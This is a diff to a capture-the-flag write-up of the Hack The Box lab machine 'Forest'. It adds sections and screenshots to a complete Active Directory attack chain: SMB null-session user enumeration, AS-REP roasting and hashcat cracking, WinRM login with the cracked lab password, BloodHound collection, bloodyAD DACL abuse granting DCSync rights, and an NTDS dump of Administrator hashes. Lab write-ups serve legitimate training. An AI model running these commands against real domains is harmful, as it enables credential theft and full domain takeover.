@@ -3,6 +3,7 @@
 ## NMAP
 
 * Rustscan Results
+
 ```console
 PORT      STATE SERVICE          REASON
 53/tcp    open  domain           syn-ack ttl 127
@@ -29,6 +30,7 @@ PORT      STATE SERVICE          REASON
 49681/tcp open  unknown          syn-ack ttl 127
 49698/tcp open  unknown          syn-ack ttl 127
 ```
+
 ## SMB
 
 * Either `enum4linux-ng` or `nxc` can fetch the users via the null session on the smb.
@@ -43,6 +45,8 @@ nxc smb $IP -u '' -p '' --users
 impacket-GetNPUsers -dc-ip $IP htb.local/ -no-pass -usersfile users.txt
 ```
 
+![GetNPUsers](/HTB/Machines/images/Forest-GetNPUsers.png)
+
 ## Hash Cracking
 
 * cracking the `AS-REP` hash via hashcat
@@ -50,16 +54,51 @@ impacket-GetNPUsers -dc-ip $IP htb.local/ -no-pass -usersfile users.txt
 ```bash
 hashcat -a 0 -m 18200 svc_alfresco_hash /usr/share/wordlists/rockyou.txt
 ```
+
+![Hash](/HTB/Machines/images/Forest-Hash.png)
+
+## Evil-Winrm
+
+* We can check if the user has winrm access via `nxc` again
+
+```bash
+nxc winrm htb.local -u 'svc-alfresco' -p 's3rvice'
+```
+
+* we can login as `svc-alfresco` and read the `User` flag
+
+![Hash](/HTB/Machines/images/Forest-User.png)
+
+## Bloodhound
+
+* we can enumerate the domain via `bloodhound`
+
+```bash
+bloodhound-python -u 'svc-alfresco' -p 's3rvice' -d 'htb.local' -dc 'forest.htb.local' -ns $IP  -c all --zip
+```
+
+![Bloodhound](/HTB/Machines/images/Forest-Bloodhound.png)
+
 ## DACL Abuse
+
+* Bloodhound suggests that we can leverage `svc-alfresco` as the owner of `EXCHANGE WINDOWS PERMISSIONS`  
 
 ```bash
 bloodyAD --host $IP -d forest.local -u svc-alfresco -p s3rvice add groupMember 'EXCHANGE WINDOWS PERMISSIONS' svc-alfresco
+
 bloodyAD --host $IP -d forest.local -u svc-alfresco -p s3rvice set owner 'EXCHANGE WINDOWS PERMISSIONS' svc-alfresco
-bloodyAD --host $IP -d forest.local -u svc-alfresco -p s3rvice add dcsync svc-alfresco
 ```
 
 ## DCSync
 
+* Upon updating the permissions and roles for the user `svc-alfresco` we can `DCSync` to dump the hashes on the DC
+
 ```bash
+bloodyAD --host $IP -d forest.local -u svc-alfresco -p s3rvice add dcsync svc-alfresco
+
 nxc smb $IP -u 'svc-alfresco' -p 's3rvice' --ntds -user Administrator
 ```
+
+![forest-root](./images/Forest-DC.png)
+
+![forest-root](./images/Forest-Root.png)
